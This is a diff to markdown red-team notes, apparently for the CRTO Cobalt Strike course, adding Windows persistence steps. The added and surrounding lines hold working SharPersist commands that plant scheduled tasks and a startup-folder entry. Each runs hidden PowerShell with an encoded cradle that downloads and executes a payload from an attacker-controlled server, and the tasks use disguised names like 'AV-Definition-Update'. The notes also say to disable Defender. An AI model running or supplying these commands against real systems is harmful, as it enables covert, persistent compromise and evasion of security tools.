@@ -97,7 +97,7 @@
 2. Copy & Paste the macro in the MS Word document (remeber to use **.doc** not the **.docx**
 3. Disable Defender and Run it, you'll get the beacon 
 
-### Persistence for MS Windows via SharPersist
+### Persistence for MS Windows via SharPersist - Mehtod schtask
 1. First generate the **x64 powershell** payload by **Attacks -> Web by Delivery -> Scripted Web Del (S)**
 2. The above will generate a **PS payload, hosted on the CS TeamServer and will be run in memory**
 3. E.g. it will be something like
@@ -111,6 +111,10 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 ```
 4. `SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMgAwADAAOgA4ADAALwA2ADQAYgBpAHQAIgApACkA" -n "AV-Definition-Update" -m add -o hourly`
 5. `SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMgAwADAAOgA4ADAALwA2ADQAYgBpAHQAIgApACkA" -n "SysMonLog" -m add -o logon`
+
+### Persistence for MS Windows via SharPersist - Mehtod startup folder
+1. `execute-assembly SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMgAwADAAOgA4ADAALwA2ADQAYgBpAHQAIgApACkA" -f "UserEnvSetup" -m add`
+2. If above command goes well, it create a file **UserEnvSetup** inside the path **C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup**
 
 ### Windows Privilege Escalation - UAC Bypass
 1. First run the SharpUp.exe via command `execute-assembly /opt/CRTO/SharpUp.exe audit`
